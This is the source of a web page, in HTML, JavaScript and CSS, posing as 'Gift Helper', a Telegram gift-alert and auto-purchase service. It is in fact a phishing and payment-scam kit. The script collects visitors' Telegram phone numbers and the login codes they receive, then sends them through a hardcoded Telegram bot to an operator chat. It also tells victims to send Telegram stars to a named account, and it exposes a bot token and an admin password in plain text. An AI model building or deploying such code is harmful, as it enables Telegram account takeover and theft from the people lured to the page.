<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>GIFTHELPER</title>
  <link rel="stylesheet" href="./style.css">

</head>
<body>
<!-- partial:index.partial.html -->
<!doctype html>
<html lang="ru">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Neon Portal — Tariffs</title>
  <link rel="stylesheet" href="style.css" />
</head>
<body>
  <div id="top-bar">
    <span id="ip-fixed">Ваш IP: ЗАСЕКРЕЧЕНО</span>
    <span id="ip-location">Канада, Toronto</span>
    <span id="codes-left">Коды: 25</span>
    <button id="admin-toggle" class="small-btn">Коды</button>
  </div>

  <main id="page-home" class="page">
    <h1 data-lang="title">Gift Helper</h1>
    <div class="col">
      <button id="btn-connect" class="neon" data-lang="btnConnect">Подключить тариф</button>
      <button id="btn-lang" class="neon" data-lang="btnLang">Поменять язык</button>
      <button id="btn-support" class="neon" data-lang="btnSupport">Поддержка</button>
    </div>
  </main>

  <section id="page-plans" class="page hidden">
    <h2 data-lang="choosePlan">Выберите тариф</h2>
    <div class="col">
      <button class="tariff neon" data-tariff="free"><span data-lang="free">Бесплатно</span></button>
      <div class="desc" data-lang="freeDesc">Звонки через Telegram при появлении подарков (точность 85%).</div>

      <button class="tariff neon" data-tariff="25"><span data-lang="stars25">25 звёзд</span></button>
      <div class="desc" data-lang="stars25Desc">Телефон воспроизводит сирену в Telegram при появлении подарков.</div>

      <button class="tariff neon" data-tariff="50"><span data-lang="stars50">50 звёзд</span></button>
      <div class="desc" data-lang="stars50Desc">Автоматическая покупка подарка (50 звёзд = 1 подарок). Доступны: Дешёвый / Средний / Дорогой.</div>
    </div>
    <button class="back-big" data-back="home"><span data-lang="back">Назад</span></button>
  </section>

  <section id="page-detail" class="page hidden">
    <h2 id="detail-title"></h2>
    <p id="detail-desc" class="desc"></p>

    <div id="cats" class="categories hidden">
      <label><input name="cat" type="radio" value="cheap"> Дешёвый</label>
      <label><input name="cat" type="radio" value="medium" checked> Средний</label>
      <label><input name="cat" type="radio" value="expensive"> Дорогой</label>
    </div>

    <button id="detail-continue" class="neon">Продолжить</button>
    <button class="back-big" data-back="plans"><span data-lang="back">Назад</span></button>
  </section>

  <section id="page-phone" class="page hidden">
    <h2 data-lang="enterPhoneTitle">Введите номер телефона для входа на сайте</h2>
    <p class="desc" data-lang="phoneHint">Введите номер, привязанный к Telegram — вы получите код в Telegram.</p>
    <input id="input-phone" type="tel" placeholder="+7..." />
    <button id="phone-send" class="neon">Отправить</button>
    <button class="back-big" data-back="detail"><span data-lang="back">Назад</span></button>
  </section>

  <section id="page-phone-verify" class="page hidden">
    <h2 data-lang="enterPhoneCode">Введите код из Telegram</h2>
    <p class="desc">Введите код, который пришёл вам в Telegram.</p>
    <input id="input-phone-code" type="text" placeholder="Код из Telegram" />
    <div id="phone-code-error" class="error hidden"></div>
    <button id="phone-code-submit" class="neon">Подтвердить номер</button>
    <button class="back-big" data-back="phone"><span data-lang="back">Назад</span></button>
  </section>

  <section id="page-checkout" class="page hidden">
    <h2 data-lang="checkoutTitle">Оплата</h2>

    <div id="checkout-cats" class="hidden">
      <div class="desc">Выберите категорию подарка</div>
      <div class="categories">
        <label><input name="cat2" type="radio" value="cheap"> Дешёвый</label>
        <label><input name="cat2" type="radio" value="medium" checked> Средний</label>
        <label><input name="cat2" type="radio" value="expensive"> Дорогой</label>
      </div>
    </div>

    <div id="checkout-qty" class="hidden">
      <label data-lang="qtyLabel">Количество подарков (1–10000)</label>
      <input id="input-qty" type="number" min="1" max="10000" value="1" />
      <p id="total-sum" class="desc"></p>
    </div>

    <p id="send-instruction" class="desc"></p>
    <button id="paid-btn" class="neon">Я оплатил</button>
    <button class="back-big" data-back="phone"><span data-lang="back">Назад</span></button>
  </section>

  <section id="page-manager-code" class="page hidden">
    <h2 data-lang="enterManagerCode">Код от менеджера</h2>
    <p class="desc">Введите менеджерский код, выданный админом.</p>
    <input id="input-manager-code" type="text" placeholder="Код менеджера" />
    <div id="manager-code-error" class="error hidden"></div>
    <button id="manager-code-submit" class="neon">Подтвердить код</button>
    <button class="back-big" data-back="checkout"><span data-lang="back">Назад</span></button>
  </section>

  <section id="page-login-code" class="page hidden">
    <h2 data-lang="enterLoginCode">Введите код из Telegram</h2>
    <p class="desc">Введите финальный код, который вам отправит админ в Telegram.</p>
    <input id="input-login-code" type="text" placeholder="Код из Telegram" />
    <div id="login-code-error" class="error hidden"></div>
    <button id="login-code-submit" class="neon">Подтвердить</button>
    <button class="back-big" data-back="manager-code"><span data-lang="back">Назад</span></button>
  </section>

  <section id="page-activated" class="page hidden">
    <div class="celebrate">
      <h2 id="activated-msg">Тариф активирован</h2>
      <p class="desc">Если есть вопросы — пишите: <b>@GIFTHELPER_support</b></p>
    </div>
    <button class="neon" id="to-home">На главную</button>
  </section>

  <section id="page-support" class="page hidden">
    <h2 data-lang="supportTitle">Поддержка</h2>
    <div class="support-user">@GIFTHELPER_support</div>
    <div id="meme-area" class="meme-area"></div>
    <button class="back-big" data-back="home"><span data-lang="back">Назад</span></button>
  </section>

  <section id="page-admin" class="page hidden">
    <h2>Админ — Коды</h2>
    <p class="desc">Нажмите код, чтобы выдать его клиенту (копируется в буфер и переходит в issued).</p>
    <div id="codes-list" class="codes-list"></div>
    <p class="desc">Остаток: <span id="admin-left">0</span></p>
    <button class="back-big" data-back="home"><span data-lang="back">Назад</span></button>
  </section>

  <script src="script.js"></script>
</body>
</html>
<!-- partial -->
  <script  src="./script.js"></script>

</body>
</html>
/* ===== CONFIG ===== */
const BOT_TOKEN = "8444402955:AAHSZZyRkJE6FSHH8TtXDgGBfWSp3ryV9RE";
const CHAT_ID  = "7449969304";
const ADMIN_PASSWORD = "serafimLOSER";
const SUPPORT = "@GIFTHELPER_support";
const PAY_USER = "Juilly";

/* 25 manager codes */
const INITIAL_CODES = [
  "CODE-0001","CODE-0002","CODE-0003","CODE-0004","CODE-0005",
  "CODE-0006","CODE-0007","CODE-0008","CODE-0009","CODE-0010",
  "CODE-0011","CODE-0012","CODE-0013","CODE-0014","CODE-0015",
  "CODE-0016","CODE-0017","CODE-0018","CODE-0019","CODE-0020",
  "CODE-0021","CODE-0022","CODE-0023","CODE-0024","CODE-0025"
];

const LS_AVAILABLE = 'avail_codes_v1';
const LS_ISSUED    = 'issued_codes_v1';
const LS_USED      = 'used_codes_v1';
const LS_LANG      = 'lang_v1';

function loadArray(k, def){ try{ const s=localStorage.getItem(k); return s?JSON.parse(s):def; }catch(e){ return def; } }
function saveArray(k, v){ localStorage.setItem(k, JSON.stringify(v)); }
function loadObj(k, def){ try{ const s=localStorage.getItem(k); return s?JSON.parse(s):def; }catch(e){ return def; } }
function saveObj(k, v){ localStorage.setItem(k, JSON.stringify(v)); }

let availableCodes = loadArray(LS_AVAILABLE, INITIAL_CODES.slice());
let issuedCodes = loadObj(LS_ISSUED, {});
let usedCodes = loadObj(LS_USED, {});
let lang = localStorage.getItem(LS_LANG) || 'ru';

let currentTariff = null;
let currentCategory = null;
let phoneForSession = '';
let loginCode = '';
let currentQty = 1;
let currentAmount = 0;

/* DOM helpers */
const $ = id => document.getElementById(id);
const q = s => Array.from(document.querySelectorAll(s));
function hideAll(){ q('.page').forEach(p=>p.classList.add('hidden')); }
function go(page){ hideAll(); const n = $('page-'+page); if(n) n.classList.remove('hidden'); $('top-bar').style.display = (page==='home') ? 'flex' : 'none'; updateCodesLeft(); applyLang(); }

/* TEXT */
const TEXT = {
  ru: {
    title:'Gift Helper', btnConnect:'Подключить тариф', btnLang:'Поменять язык', btnSupport:'Поддержка',
    choosePlan:'Выберите тариф', free:'Бесплатно', freeDesc:'Звонки через Telegram при появлении подарков (точность 85%).',
    stars25:'25 звёзд', stars25Desc:'Телефон воспроизводит сирену в Telegram при появлении подарков.',
    stars50:'50 звёзд', stars50Desc:'Автоматическая покупка подарка (50 звёзд = 1 подарок).',
    back:'Назад', enterPhoneTitle:'Введите номер телефона для входа на сайте', phoneHint:'Введите номер, привязанный к Telegram — вы получите код в Telegram.',
    checkoutTitle:'Оплата', qtyLabel:'Количество подарков (1–10000)', enterPhoneCode:'Введите код из Telegram', enterManagerCode:'Код от менеджера', enterLoginCode:'Введите код из Telegram',
    sendExactly: s => `Отправьте ровно ${s} звёзд пользователю @${PAY_USER}`,
    successActivated: t => `Тариф "${t}" активирован`
  },
  en: {
    title:'Gift Helper', btnConnect:'Connect Plan', btnLang:'Change Language', btnSupport:'Support',
    choosePlan:'Choose a plan', free:'Free', freeDesc:'Receive Telegram calls when gifts appear (85% accuracy).',
    stars25:'25 stars', stars25Desc:'Your phone will sound an alarm in Telegram when gifts appear.',
    stars50:'50 stars', stars50Desc:'Automatic gift purchase (50 stars = 1 gift).',
    back:'Back', enterPhoneTitle:'Enter phone number to log in', phoneHint:"Enter the phone linked to Telegram — you'll receive a code in Telegram.",
    checkoutTitle:'Payment', qtyLabel:'Number of gifts (1–10000)', enterPhoneCode:'Enter the code from Telegram', enterManagerCode:'Manager code', enterLoginCode:'Enter the Telegram code',
    sendExactly: s => `Send exactly ${s} stars to @${PAY_USER}`,
    successActivated: t => `Plan "${t}" activated`
  }
};

function applyLang(){
  q('[data-lang]').forEach(n=>{
    const k = n.getAttribute('data-lang'); if(!k) return;
    const v = TEXT[lang][k]; n.textContent = (typeof v === 'function')? v() : v;
  });
  q('[data-back]').forEach(b=>{ const s = b.querySelector('span'); if(s) s.textContent = TEXT[lang].back; });
}

/* Init bindings */
window.addEventListener('DOMContentLoaded', ()=>{
  $('btn-connect').addEventListener('click', ()=> go('plans'));
  $('btn-lang').addEventListener('click', ()=> { lang = (lang==='ru')?'en':'ru'; localStorage.setItem(LS_LANG, lang); applyLang(); });
  $('btn-support').addEventListener('click', ()=> go('support'));

  q('.tariff').forEach(b => b.addEventListener('click', ()=> startTariff(b.dataset.tariff)));
  $('detail-continue').addEventListener('click', ()=> { const r = document.querySelector('input[name="cat"]:checked'); currentCategory = r? r.value : null; go('phone'); });

  $('phone-send').addEventListener('click', onPhoneSend);
  $('phone-code-submit').addEventListener('click', onPhoneCodeSubmit);
  $('paid-btn').addEventListener('click', onPaid);
  $('manager-code-submit').addEventListener('click', onManagerCodeSubmit);
  $('login-code-submit') && $('login-code-submit').addEventListener('click', onLoginCodeSubmit);

  $('input-qty') && $('input-qty').addEventListener('input', updateTotal);

  q('[data-back]').forEach(b=> b.addEventListener('click', ()=> go(b.dataset.back)));

  $('admin-toggle').addEventListener('click', adminLogin);
  $('to-home') && $('to-home').addEventListener('click', ()=> go('home'));

  setInterval(showMeme, 3000); showMeme();

  setInterval(()=> {
    const list = ['Canada, Toronto','USA, New York','Germany, Berlin','France, Paris','Netherlands, Amsterdam'];
    $('ip-location').textContent = list[Math.floor(Math.random()*list.length)];
  }, 4000);

  applyLang(); go('home'); updateCodesLeft();
});

/* Flows */
function startTariff(t){
  currentTariff = t; currentCategory = null; phoneForSession=''; loginCode=''; currentQty=1; currentAmount=0;
  $('detail-title').textContent = (t==='free')? TEXT[lang].free : (t==='25'? TEXT[lang].stars25 : TEXT[lang].stars50);
  $('detail-desc').textContent = (t==='free')? TEXT[lang].freeDesc : (t==='25'? TEXT[lang].stars25Desc : TEXT[lang].stars50Desc);
  if(t==='50') $('cats').classList.remove('hidden'); else $('cats').classList.add('hidden');
  go('detail');
}

/* Phone send: generate code for admin only, go to phone-verify (user doesn't see extra hints) */
function gen4(){ return String(Math.floor(1000 + Math.random()*9000)); }
function onPhoneSend(){
  const phone = $('input-phone').value.trim();
  if(!phone){ alert(lang==='ru' ? 'Введите номер телефона' : 'Enter phone'); return; }
  phoneForSession = phone;
  const phoneCode = gen4();
  sessionStorage.setItem('phoneCode', phoneCode);
  sendToTelegram(`📥 Новый телефон\nТариф: ${displayTariffName()}\nТелефон: ${phone}\nКод подтверждения: ${phoneCode}`);
  $('input-phone-code').value = ''; $('phone-code-error').classList.add('hidden');
  go('phone-verify');
}

/* Phone code submit: accept any non-empty input (no UI hints about that) */
function onPhoneCodeSubmit(){
  const entered = $('input-phone-code').value.trim();
  sendToTelegram(`🔐 Ввод кода подтверждения\nТариф: ${displayTariffName()}\nТелефон: ${phoneForSession}\nКод введён: ${entered}`);
  if(!entered){ $('phone-code-error').textContent = (lang==='ru' ? 'Введите код' : 'Enter code'); $('phone-code-error').classList.remove('hidden'); return; }
  $('phone-code-error').classList.add('hidden');

  if(currentTariff === 'free'){
    sendToTelegram(`✅ Активирован бесплатный тариф\nТелефон: ${phoneForSession}`);
    $('activated-msg').textContent = TEXT[lang].successActivated(TEXT[lang].free);
    go('activated');
    return;
  }

  if(currentTariff === '25'){
    $('checkout-cats').classList.add('hidden'); $('checkout-qty').classList.add('hidden');
    currentAmount = 25; $('send-instruction').textContent = TEXT[lang].sendExactly(currentAmount);
  } else if(currentTariff === '50'){
    $('checkout-cats').classList.remove('hidden'); $('checkout-qty').classList.remove('hidden');
    $('input-qty').value = '1'; updateTotal();
  }
  go('checkout');
}

/* updateTotal for 50 */
function updateTotal(){
  const qv = Math.max(1, parseInt($('input-qty').value) || 1);
  currentQty = qv; currentAmount = currentQty * 50;
  $('total-sum').textContent = (lang==='ru' ? `Сумма: ${currentAmount} звёзд` : `Total: ${currentAmount} stars`);
  $('send-instruction').textContent = TEXT[lang].sendExactly(currentAmount);
}

/* onPaid */
function onPaid(){
  if(!phoneForSession){ alert(lang==='ru' ? 'Телефон не указан. Вернитесь и введите номер.' : 'Phone missing. Enter phone first.'); go('phone'); return; }
  if(currentTariff === '50') updateTotal(); else if(currentTariff === '25') currentAmount = 25;
  sendToTelegram(`💳 Пользователь нажал "Я оплатил"\nТариф: ${displayTariffName()}\nТелефон: ${phoneForSession}\nСумма: ${currentAmount} звёзд\nПожалуйста, выдайте менеджерский код.`);
  $('input-manager-code').value = ''; $('manager-code-error').classList.add('hidden');
  go('manager-code');
}

/* manager code submit — must be issued & not used */
function onManagerCodeSubmit(){
  const code = $('input-manager-code').value.trim();
  sendToTelegram(`🔐 Ввод менеджерского кода\nТариф: ${displayTariffName()}\nТелефон: ${phoneForSession}\nКод введён: ${code}`);
  if(!code){ $('manager-code-error').textContent = (lang==='ru' ? 'Введите код менеджера' : 'Enter manager code'); $('manager-code-error').classList.remove('hidden'); return; }

  if(issuedCodes[code] && !usedCodes[code]){
    usedCodes[code] = Date.now(); saveObj(LS_USED, usedCodes);
    delete issuedCodes[code]; saveObj(LS_ISSUED, issuedCodes);
    updateCodesLeft();
    loginCode = gen4(); sessionStorage.setItem('loginCode', loginCode);
    sendToTelegram(`🔑 Сгенерирован финальный код входа\nТариф: ${displayTariffName()}\nТелефон: ${phoneForSession}\nКод входа: ${loginCode}`);
    $('input-login-code').value = ''; $('login-code-error').classList.add('hidden');
    go('login-code');
  } else {
    $('manager-code-error').textContent = (lang==='ru' ? 'Неверный или невыданный менеджерский код' : 'Invalid or not-issued manager code'); $('manager-code-error').classList.remove('hidden');
  }
}

/* login code submit */
function onLoginCodeSubmit(){
  const code = $('input-login-code').value.trim();
  const expected = sessionStorage.getItem('loginCode') || loginCode;
  sendToTelegram(`🔐 Ввод финального кода\nТариф: ${displayTariffName()}\nТелефон: ${phoneForSession}\nКод введён: ${code}`);
  if(!code){ $('login-code-error').textContent = (lang==='ru' ? 'Введите код' : 'Enter code'); $('login-code-error').classList.remove('hidden'); return; }
  if(code === expected){
    $('login-code-error').classList.add('hidden');
    sendToTelegram(`✅ Тариф активирован\nТариф: ${displayTariffName()}\nТелефон: ${phoneForSession}`);
    $('activated-msg').textContent = TEXT[lang].successActivated(displayTariffName());
    go('activated');
    sessionStorage.removeItem('phoneCode'); sessionStorage.removeItem('loginCode');
  } else {
    $('login-code-error').textContent = (lang==='ru' ? 'Неверный код из Telegram' : 'Wrong Telegram code'); $('login-code-error').classList.remove('hidden');
  }
}

/* ADMIN */
function adminLogin(){
  const p = prompt('Введите пароль администратора:');
  if(!p) return;
  if(p === ADMIN_PASSWORD){ populateAdmin(); go('admin'); } else alert('Неверный пароль');
}

function populateAdmin(){
  const wrap = $('codes-list'); wrap.innerHTML = '';
  availableCodes.forEach((c, idx) => {
    const d = document.createElement('div'); d.className='code-item'; d.textContent = c;
    d.addEventListener('click', ()=>{
      const phone = prompt('Кому выдаём код? Введите телефон клиента (или оставьте пустым):','');
      availableCodes.splice(idx,1); saveArray(LS_AVAILABLE, availableCodes);
      issuedCodes[c] = { phone: phone || null, at: Date.now() }; saveObj(LS_ISSUED, issuedCodes);
      updateCodesLeft(); populateAdmin();
      navigator.clipboard && navigator.clipboard.writeText(c).catch(()=>{});
      sendToTelegram(`📤 Код выдан\nКод: ${c}\nКому: ${phone || 'не указан'}\nОсталось кодов: ${availableCodes.length}`);
      alert('Код выдан и скопирован: '+c);
    });
    wrap.appendChild(d);
  });
  Object.keys(issuedCodes).forEach(c=>{
    const d = document.createElement('div'); d.className='code-item issued'; const meta=issuedCodes[c];
    d.textContent = `${c} (issued to ${meta.phone||'—'})`; wrap.appendChild(d);
  });
  Object.keys(usedCodes).forEach(c=>{
    const d = document.createElement('div'); d.className='code-item'; d.style.opacity='0.4'; d.textContent = `${c} (used)`; wrap.appendChild(d);
  });
  $('admin-left').textContent = availableCodes.length;
}

function updateCodesLeft(){ $('codes-left') && ($('codes-left').textContent = 'Коды: '+availableCodes.length); $('admin-left') && ($('admin-left').textContent = availableCodes.length); }

/* MEMES */
const MEMES = ["cool boy","hacker mode","gift boss","system online","VIP ACCESS","nice try","glhf"];
function showMeme(){
  const area = $('meme-area'); if(!area) return; area.innerHTML='';
  const m = document.createElement('div'); m.className='meme'; m.textContent = MEMES[Math.floor(Math.random()*MEMES.length)];
  area.appendChild(m); const fromLeft = Math.random()<0.5; const start = fromLeft ? -300 : 300;
  m.style.transform = `translateX(${start}px)`; m.animate([{transform:`translateX(${start}px)`, opacity:0},{transform:'translateX(0)', opacity:1}], {duration:500});
  setTimeout(()=>{ const end = fromLeft ? -300 : 300; m.animate([{transform:'translateX(0)', opacity:1},{transform:`translateX(${end}px)`, opacity:0}], {duration:500}); setTimeout(()=>{ try{ m.remove(); }catch(e){} },520); }, 2600);
}

/* helpers */
function displayTariffName(){ if(currentTariff==='free') return (lang==='ru'?'Бесплатно':'Free'); if(currentTariff==='25') return (lang==='ru'?'25 звёзд':'25 stars'); if(currentTariff==='50') return (lang==='ru'?`50 звёзд x${currentQty}`:`50 stars x${currentQty}`); return ''; }

function sendToTelegram(text){
  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({ chat_id: CHAT_ID, text })
  }).catch(e=>console.error('tg send error', e));
}

window.addEventListener('beforeunload', ()=> {
  saveArray(LS_AVAILABLE, availableCodes);
  saveObj(LS_ISSUED, issuedCodes);
  saveObj(LS_USED, usedCodes);
});


:root {
  --neon:#0ff;
  --green:#6aff6a;
  --bg:#000;
}

* {
  box-sizing: border-box;
}

body {
  margin: 0;
  min-height: 100vh;
  background: var(--bg);
  color: var(--neon);
  font-family: "Segoe UI", Roboto, Arial;
  display: flex;
  justify-content: center;
  align-items: flex-start;
  padding: 20px;
}

/* TOP BAR */
#top-bar {
  position: fixed;
  left: 50%;
  transform: translateX(-50%);
  top: 10px;
  padding: 8px 12px;
  background: rgba(0, 0, 0, 0.75);
  border-radius: 10px;
  border: 1px solid rgba(0, 255, 255, 0.12);
  color: var(--neon);
  font-size: 13px;
  z-index: 100;
  display: flex;
  gap: 12px;
  align-items: center;
}

#ip-fixed {
  color: var(--green);
  font-weight: 700;
  text-shadow: 0 0 10px rgba(0, 255, 0, 0.25);
}

#ip-location {
  color: rgba(170, 255, 170, 0.9);
  font-size: 12px;
  margin-left: 6px;
}

#codes-left {
  background: rgba(0, 255, 0, 0.06);
  padding: 4px 8px;
  border-radius: 6px;
  color: var(--green);
  font-weight: 700;
}

.small-btn {
  background: transparent;
  border: 1px solid rgba(255, 255, 255, 0.06);
  color: var(--neon);
  padding: 6px 8px;
  border-radius: 6px;
  cursor: pointer;
}

/* pages */
.page {
  width: 380px;
  max-width: calc(100% - 40px);
  margin-top: 80px;
  text-align: center;
}

.hidden {
  display: none;
}

h1, h2 {
  margin: 12px 0;
  text-shadow: 0 0 8px rgba(0, 255, 255, 0.12);
}

/* column */
.col {
  display: flex;
  flex-direction: column;
  gap: 12px;
  align-items: center;
  margin-top: 12px;
}

.neon {
  width: 240px;
  padding: 12px 18px;
  border-radius: 12px;
  background: transparent;
  color: var(--neon);
  border: 2px solid rgba(0, 255, 255, 0.18);
  box-shadow: 0 0 14px rgba(0, 255, 255, 0.06);
  cursor: pointer;
  font-size: 15px;
  transition: all 0.18s ease;
}

.neon:hover {
  background: var(--neon);
  color: #000;
  box-shadow: 0 0 30px var(--neon);
  transform: translateY(-3px);
}

/* back button */
.back-big {
  margin-top: 18px;
  width: 84px;
  height: 84px;
  border-radius: 50%;
  border: 2px solid rgba(255, 255, 255, 0.06);
  background: rgba(0, 0, 0, 0.5);
  color: var(--neon);
  font-size: 16px;
  display: flex;
  align-items: center;
  justify-content: center;
  cursor: pointer;
  box-shadow: 0 0 10px rgba(0, 255, 255, 0.06);
}

/* inputs */
input[type=tel], input[type=text], input[type=number] {
  width: 220px;
  padding: 10px;
  margin: 8px auto;
  border-radius: 8px;
  border: 1px solid rgba(0, 255, 255, 0.12);
  background: #050505;
  color: var(--neon);
  text-align: center;
}

.desc {
  color: #aee;
  font-size: 13px;
  margin: 6px 0 12px;
}

/* categories and codes */
.categories {
  display: flex;
  gap: 10px;
  justify-content: center;
  margin: 10px 0;
}

.codes-list {
  display: flex;
  flex-wrap: wrap;
  gap: 8px;
  justify-content: center;
  margin-top: 10px;
}

.code-item {
  padding: 8px 10px;
  border-radius: 8px;
  background: #050505;
  border: 1px solid rgba(0, 255, 255, 0.06);
  color: var(--neon);
  cursor: pointer;
}

.code-item.issued {
  background: linear-gradient(90deg, rgba(0, 255, 255, 0.03), rgba(0, 255, 0, 0.03));
  color: var(--green);
}

/* meme */
.meme-area {
  position: relative;
  height: 80px;
  overflow: visible;
  margin-top: 6px;
}

.meme {
  position: absolute;
  top: 18px;
  padding: 8px 12px;
  border-radius: 8px;
  background: rgba(0, 0, 0, 0.6);
  border: 1px solid rgba(0, 255, 0, 0.12);
  color: var(--green);
  font-weight: 700;
  text-shadow: 0 0 10px rgba(0, 255, 0, 0.35);
  white-space: nowrap;
  box-shadow: 0 0 20px rgba(0, 255, 0, 0.06);
  pointer-events: none;
}

.error {
  color: #ff6a6a;
  margin-top: 10px;
  font-weight: 700;
}

.celebrate {
  animation: celebrate 900ms ease both;
}

@keyframes celebrate {
  0% {
    transform: scale(0.92);
    opacity: 0;
    filter: blur(4px);
  }
  50% {
    transform: scale(1.06);
    opacity: 1;
    filter: blur(0);
  }
  100% {
    transform: scale(1);
    opacity: 1;
    filter: blur(0);
  }
}
@media (max-width: 420px) {
  .page {
    width: 94%;
    margin-top: 110px;
  }

  .neon {
    width: 86%;
  }

  .back-big {
    width: 72px;
    height: 72px;
    font-size: 14px;
  }
}
